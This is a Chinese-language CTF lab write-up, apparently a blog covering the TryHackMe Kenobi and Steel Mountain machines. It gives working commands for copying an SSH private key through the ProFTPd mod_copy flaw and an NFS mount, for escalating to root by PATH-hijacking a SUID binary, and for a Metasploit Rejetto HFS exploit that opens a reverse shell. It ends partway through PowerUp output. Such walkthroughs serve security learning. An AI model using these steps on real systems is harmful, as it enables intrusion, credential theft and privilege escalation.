<h2 id="使用-proftpd-获得初始访问权限">使用 ProFtpd 获得初始访问权限</h2>
<p>ProFtpd 是一个免费的开源 FTP 服务器，兼容 Unix 和 Windows 系统。在过去的软件版本中，它也容易受到攻击。</p>
<p>可以使用netcat来连接FTP服务，看其版本信息<code>nc ip 21</code></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839598.png" alt="image-20240404094914714"></p>
<p>我们可以使用 searchsploit 来查找特定软件版本的漏洞。Searchsploit 基本上只是 <a target="_blank" rel="noopener" href="http://exploit-db.com">exploit-db.com</a> 的命令行搜索工具。</p>
<p>ProFTPd 运行有多少漏洞？</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839599.png" alt="image-20240404095016525"></p>
<p>我们可以看到，该版本ProFtpd的mod_copy模块中存在漏洞。<br>
（mod_copy模块功能-参考链接：<a target="_blank" rel="noopener" href="http://www.proftpd.org/docs/contrib/mod_copy.html">http://www.proftpd.org/docs/contrib/mod_copy.html</a> ）</p>
<p>mod_copy模块实现了SITE CPFR 和 SITE CPTO 命令(类似于 RNFR 和 RNTO) ，这些命令可以用来将文件/目录从服务器上的一个地方复制到另一个地方，而无需将数据传输到客户端并等待返回（无身份验证），该模块包含在 ProFTPD 1.3.x 的 mod_copy.c 文件中，默认情况下不进行编译。</p>
<p>也就是说：任何未经身份验证的客户机都可以利用SITE CPFR 和 SITE CPTO 命令，将文件从FTP服务器的文件系统的任何位置复制到选定的位置。</p>
<p>由之前的信息我们知道：Kenobi是运行FTP服务的用户、Kenobi用户的ssh密钥保存路径。</p>
<p>现在我们将使用 SITE CPFR 和 SITE CPTO 命令复制Kenobi的ssh私钥，我们将私钥复制到NFS所挂载的目录下，后继我们就能获取到这个私钥文件：</p>
<pre><code class="hljs scss">#连接目标机的FTP服务器,FTP运行在<span class="hljs-number">21</span>端口
nc <span class="hljs-number">10.10</span><span class="hljs-selector-class">.54</span><span class="hljs-selector-class">.34</span> <span class="hljs-number">21</span>
SITE CPFR /home/kenobi/<span class="hljs-selector-class">.ssh</span>/id_rsa
SITE CPTO /<span class="hljs-selector-tag">var</span>/tmp/id_rsa  #将密钥复制到NFS所挂载的/<span class="hljs-selector-tag">var</span>目录下</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839600.png" alt="image-20240404095647434"></p>
<p>然后让我们将目标机的/var/tmp 目录挂载到我们的攻击机上：</p>
<pre><code class="hljs scss">mkdir /mnt/kenobiNFS
mount <span class="hljs-number">10.10</span><span class="hljs-selector-class">.54</span><span class="hljs-selector-class">.34</span>:/var /mnt/kenobiNFS   #此处的ip是目标机ip。完成挂载后：目标机的/var目录下的所有文件，都将在攻击机的/mnt/kenobiNFS目录下
ls -la /mnt/kenobiNFS</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839601.png" alt="image-20240404100004248"></p>
<p>复制Kenobi的ssh私钥到攻击机当前目录，然后使用ssh登录到 Kenobi 的帐户，查看标志性文件：</p>
<pre><code class="hljs scss">cp /mnt/kenobiNFS/tmp/id_rsa .
chmod <span class="hljs-number">600</span> id_rsa
ssh -<span class="hljs-selector-tag">i</span> id_rsa kenobi@<span class="hljs-number">10.10</span>.<span class="hljs-number">67.234</span> -oHostKeyAlgorithms=+ssh-rsa</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839602.png" alt="image-20240404100843433"></p>
<pre><code> 这条命令是在Linux系统中使用OpenSSH客户端连接到远程主机的命令行语句。其中，每个参数的含义如下：
</code></pre>
<ul>
<li><code>ssh</code>：OpenSSH客户端命令，负责连接到远程主机并启动Shell。</li>
<li><code>-i</code>：指定使用哪个私钥文件进行身份认证。</li>
<li><code>id_rsa</code>：指定使用<code>~/.ssh/id_rsa</code>文件作为私钥。</li>
<li><code>kenobi</code>：远程主机的用户名。</li>
<li><code>@</code>：用户名和IP地址之间的分隔符。</li>
<li><code>10.10.67.234</code>：远程主机的IP地址。</li>
<li><code>-o</code>：指定连接选项。</li>
<li><code>HostKeyAlgorithms</code>：指定允许使用的主机密钥算法。</li>
<li><code>+ssh-rsa</code>：指定允许使用RSA签名密钥算法进行连接。</li>
</ul>
<p>总之，这条命令的作用是使用指定的私钥(<code>id_rsa</code>)连接到远程主机(<code>10.10.67.234</code>)，并允许使用RSA签名密钥算法进行身份认证。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839603.png" alt="image-20240404101212748"></p>
<h2 id="通过path变量提权">通过PATH变量提权</h2>
<p>我们先了解SUID、SGID和SBIT(Sticky Bits)，这三个概念 我们在提权基础篇有详细讲解：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839604.png" alt="image-20240404101427124"></p>
<pre><code class="hljs scss">权限                        在文件上                                            在目录上
SUID Bit             用户使用文件所有者的权限执行文件                               -
SGID Bit             用户在组所有者的权限下执行该文件                          在目录中创建的文件获取相同的组所有者。
Sticky Bit           无意义                                                阻止用户删除其他用户目录下的文件</code></pre>
<p>SUID位是很不安全的，一些二进制文件确实需要提高权限来运行才被赋予SUID位(如/usr/bin/passwd，因为你需要使用它以便在系统上重置个人密码)，但是其他具有 SUID 位的自定义文件可能会导致各种各样的问题。</p>
<p>要在目标机系统中搜索SUID/SGID类型的文件，请在目标机上运行以下命令：</p>
<pre><code class="hljs scss">find / -perm -u=s -type f <span class="hljs-number">2</span>&gt;/dev/null</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839605.png" alt="image-20240404101934649"></p>
<p>找出看起来很不寻常的文件/usr/bin/menu ，并尝试执行它：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839606.png" alt="image-20240404102807352"></p>
<p>strings 是 Linux 上的一个命令，它能在二进制文件上查找人类可读的字符串，我们使用以下命令来查看/usr/bin/menu运行时的信息（因为执行menu命令时有文字回显，我们才使用strings命令）：</p>
<pre><code class="hljs scss">strings /usr/bin/<span class="hljs-selector-tag">menu</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839607.png" alt="image-20240404102929567"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839608.png" alt="image-20240404103003344"></p>
<p>观察上图可以得知：当我们执行/usr/bin/menu 时，选择选项1其实是在执行一个<code>curl</code>命令，选择选项2其实是在执行<code>uname -r</code>命令。</p>
<p>这表明二进制文件curl和uname，是在没有完整路径的情况下运行的(例如没有使用/usr/bin/curl 或/usr/bin/uname运行文件)。</p>
<p>我们已经知道/usr/bin/menu文件是一个SUID文件，它在执行时会暂时具有root 用户权限，我们可以尝试自定义创建一个curl文件（并写入/bin/bash，意思是打开一个bash shell），然后我们再给自定义的curl文件附加可执行权限（+x），接着将自定义的curl文件所在的路径添加到PATH变量中（这样能够保证我们自定义的curl文件能够被首先找到）。</p>
<p>完成以上操作之后，执行SUID文件/usr/bin/menu，产生的效果是：以root权限打开一个bash shell-----这将获得root shell</p>
<pre><code class="hljs scss">cd /tmp
echo /bin/bash &gt; curl
chmod +x curl
export PATH=/tmp:<span class="hljs-variable">$PATH</span>   #新添加的路径/tmp会在PATH变量的最前面，这样就能用我们伪造的curl文件代替真实的curl文件，保证自定义的curl文件被成功执行
/usr/bin/menu            #在跳出选项时，我们选择选项<span class="hljs-number">1</span>，这样就能调用到伪造的curl文件
ls /root/
cat /root/root.txt</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839609.png" alt="image-20240404103321329"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839610.png" alt="image-20240404103347734"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839614.png" alt="image-20240404103424630"></p>
<h2 id="总结">总结</h2>
<p>这里涉及的知识有点多：思路是nmap常规扫描，发现445和139端口暴露，接着尝试枚举Samba共享，发现存在三个共享的路径，并且其中有的可以匿名访问，访问成功之后，发现其中有个log.txt文件，下载下来发现其中含有kenobi用户的ssh秘钥以及ProFtpd信息。</p>
<p>接着利用端口111的rpcbind服务，发现该服务启动了nfs，之后枚举nfs发现存在2个可以远程共享访问的目录，看到第二个目录下存在的信息很多，尝试之后挂载该目录到我们本地上。接着看一下当前ftp服务对应版本，发现存在相关漏洞，利用该漏洞，直接将靶机的ssh秘钥文件下载到了我们要挂载的目录上。接着用nfs挂载到我们本地上之后，成功拿到ssh秘钥，接着ssh登录，之后就是提权了，不过这里用算是个环境变量劫持吧。</p>
<p>先是发现对方的suid文件中有一个可以的文件menu发现其中执行了curl的命令，然后我们尝试将/bin/bash写入到curl命令中，然后将该curl对应的路径提添加到环境变量最前面，就相当于命令替换了，接着运行menu文件（属主为root），相当于以root用户运行了/bin/bash，也就提权了</p>
<h1 id="0x04-steel-mountain挑战">0x04 Steel Mountain挑战</h1>
<p>闯入以机器人先生为主题的 Windows 机器。使用 metasploit 进行初始访问，利用 powershell 进行 Windows 权限提升枚举，并学习获取管理员访问权限的新技术。</p>
<p>在此聊天室中，你将枚举一台 Windows 计算机，使用 Metasploit 获得初始访问权限，使用 Powershell 进一步枚举该计算机，并将您的权限提升为管理员。</p>
<p>如果您没有合适的安全工具和环境，请部署您自己的 Kali Linux 机器，并使用我们的 Kali Room 在您的浏览器中对其进行控制。</p>
<p>请注意，此计算机不响应 ping （ICMP），可能需要几分钟才能启动。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839615.png" alt="image-20240404105347646"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839616.png" alt="image-20240404105355919"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839617.png" alt="image-20240404105401049"></p>
<h2 id="初始访问">初始访问</h2>
<p>也是很迷惑，至今还是在摸索如何才能较为恰当的使用nmap扫描命令，感觉选的总不是最佳的，慢慢体会吧</p>
<pre><code class="hljs scss">nmap -Pn -sV -sC <span class="hljs-number">10.10</span><span class="hljs-selector-class">.97</span><span class="hljs-selector-class">.69</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839618.png" alt="image-20240404110823643"></p>
<p>除了默认的80端口之外，目标站点还开放了8080端口提供http服务，查看8080端口的webserver页面：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839619.png" alt="image-20240404111228286"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839620.png" alt="image-20240404111240162"></p>
<p>可见这里的文件服务器是rejetto http file server</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839621.png" alt="image-20240404112515408"></p>
<pre><code class="hljs scss">msfconsole -<span class="hljs-selector-tag">q</span>             #跳过提示语打开msf
search Rejetto
use exploit/windows/http/rejetto_hfs_exec
options
set RHOSTS <span class="hljs-number">10.10</span><span class="hljs-selector-class">.97</span><span class="hljs-selector-class">.69</span>
set RPORT <span class="hljs-number">8080</span>
set LHOST <span class="hljs-number">10.11</span><span class="hljs-selector-class">.81</span><span class="hljs-selector-class">.232</span>    #当使用OpenVPN连接到TryHackMe内网时，需要设置该选项为tun0地址
exploit                   #或者run

shell                     #由meterpreter shell界面进入Windows shell界面
cd C:\Users\bill\Desktop\
dir
more user.txt</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839622.png" alt="image-20240404113036011"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839623.png" alt="image-20240404113057883"></p>
<h2 id="权限提升">权限提升</h2>
<p>现在，您在此 Windows 计算机上有一个初始 shell，即 Bill，我们可以进一步枚举该计算机并将我们的权限升级为 root！</p>
<p>现在我们在这台机器上有了一个初始 shell，我们可以进一步枚举操作系统信息并查看将权限升级到root的利用点，使用名为“ PowerUp”的 PowerShell 脚本来评估这台 Windows 机器并确定目标机是否存在任何异常和错误配置。</p>
<p>下载脚本到你的本地终端(注意不要使用命令行的形式下载这个脚本，而是复制脚本内容并新建一个ps1文件):</p>
<p><a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1</a></p>
<p>一旦脚本保存在本地，就可以通过 meterpreter shell 上传该脚本:（这里我直接git了github项目）</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839624.png" alt="image-20240404113753554"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839625.png" alt="image-20240404113840187"></p>
<p>然后我们可以通过meterpreter会话来加载PowerShell扩展，并进入 PowerShell的shell界面并执行脚本:</p>
<pre><code class="hljs scss">load powershell
powershell_shell
Import-Module .\PowerUp<span class="hljs-selector-class">.ps1</span>
Invoke-AllChecks</code></pre>
<pre><code class="hljs scss">meterpreter &gt; load powershell                                                                         
Loading extension powershell..<span class="hljs-selector-class">.Success</span>.                                                               
meterpreter &gt; powershell_shell                                                                        
PS &gt; Import-Moudle .\PowerUp<span class="hljs-selector-class">.ps1</span>                                                                  
PS &gt; Invoke-AllChecks                                                                                 
                                                                                                   
ServiceName    : AdvancedSystemCareService9                                                           
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe                      
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubd
irectory}                                                                                             
StartName      : LocalSystem                                                                          
AbuseFunction  : Write-ServiceBinary -Name <span class="hljs-string">'AdvancedSystemCareService9'</span> -Path             
CanRestart     : True                                                                                 
Name           : AdvancedSystemCareService9                                                           
Check          : Unquoted Service Paths                                                               
                                                                                                      
ServiceName    : AdvancedSystemCareService9                                                           
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe                      
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem                                                                          
AbuseFunction  : Write-ServiceBinary -Name <span class="hljs-string">'AdvancedSystemCareService9'</span> -Path             
CanRestart     : True                                                                                 
Name           : AdvancedSystemCareService9                                                           
Check          : Unquoted Service Paths                                                               
                                                                                                      
ServiceName    : AdvancedSystemCareService9                                                           
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe                      
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit; IdentityReference=STEELMOUNTAIN\bill; 
                 Permissions=System<span class="hljs-selector-class">.Object</span><span class="hljs-selector-attr">[]</span>}                                                         
StartName      : LocalSystem                                                                          
AbuseFunction  : Write-ServiceBinary -Name <span class="hljs-string">'AdvancedSystemCareService9'</span> -Path             
CanRestart     : True                                                                                 
Name           : AdvancedSystemCareService9                                                           
Check          : Unquoted Service Paths                                                               
                                                                                                      
ServiceName    : AdvancedSystemCareService9                                                           
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe                      
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe;    
                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System<span class="hljs-selector-class">.Object</span><span class="hljs-selector-attr">[]</span>}                   
StartName      : LocalSystem                                                                          
AbuseFunction  : Write-ServiceBinary -Name <span class="hljs-string">'AdvancedSystemCareService9'</span> -Path             
CanRestart     : True                                                                                 
Name           : AdvancedSystemCareService9                                                           
Check          : Unquoted Service Paths                                                               
                                                                                                      
ServiceName    : AWSLiteAgent                                                                         
Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe                                       
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubd
irectory}                                                                                             
StartName      : LocalSystem                                                                          
AbuseFunction  : Write-ServiceBinary -Name <span class="hljs-string">'AWSLiteAgent'</span> -Path                           
CanRestart     : False                                                                                
Name           : AWSLiteAgent                                                                         
Check          : Unquoted Service Paths                                                               
                                                                                                      
ServiceName    : AWSLiteAgent                                                                         
Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe                                       
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem                                                                          
AbuseFunction  : Write-ServiceBinary -Name <span class="hljs-string">'AWSLiteAgent'</span> -Path                           
CanRestart     : False                                                                                
Name           : AWSLiteAgent                                                                         
Check          : Unquoted Service Paths                                                               
                                                                                                      
ServiceName    : IObitUnSvr                                                                           
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe                         
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubd
irectory}                                                                                             
StartName      : LocalSystem                                                                          
AbuseFunction  : Write-ServiceBinary -Name <span class="hljs-string">'IObitUnSvr'</span> -Path                             
CanRestart     : False                                                                                
Name           : IObitUnSvr                                                                           
Check          : Unquoted Service Paths                                                               
                                                                                                      
ServiceName    : IObitUnSvr                                                                           
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe                         
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem                                                                          
AbuseFunction  : Write-ServiceBinary -Name <span class="hljs-string">'IObitUnSvr'</span> -Path                             
CanRestart     : False                                                                                
Name           : IObitUnSvr                                                                           
Check          : Unquoted Service Paths                                                               
                                                                                                      
ServiceName    : IObitUnSvr                                                                           
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe                         
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit; IdentityReference=STEELMOUNTAIN\bill; 
                 Permissions=System<span class="hljs-selector-class">.Object</span><span class="hljs-selector-attr">[]</span>}                                                         
StartName      : LocalSystem                                                                          
AbuseFunction  : Write-ServiceBinary -Name <span class="hljs-string">'IObitUnSvr'</span> -Path                             
CanRestart     : False                                                                                
Name           : IObitUnSvr                                                                           
Check          : Unquoted Service Paths                                                               
                                                                                                      
ServiceName    : IObitUnSvr                                                                           
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe                         
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe;       
                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System<span class="hljs-selector-class">.Object</span><span class="hljs-selector-attr">[]</span>}                   
StartName      : LocalSystem                                                                          
AbuseFunction  : Write-ServiceBinary -Name <span class="hljs-string">'IObitUnSvr'</span> -Path                             
CanRestart     : False                                                                                
Name           : IObitUnSvr                                                                           
Check          : Unquoted Service Paths                                                               
                                                                                                      
ServiceName    : LiveUpdateSvc                                                                        
Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe                               
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubd
irectory}                                                                                             
StartName      : LocalSystem                                                                          
AbuseFunction  : Write-ServiceBinary -Name <span class="hljs-string">'LiveUpdateSvc'</span> -Path                          
CanRestart     : False                                                                                
Name           : LiveUpdateSvc                                                                        
Check          : Unquoted Service Paths                                                               
                                                                                                      
ServiceName    : LiveUpdateSvc                                                                        
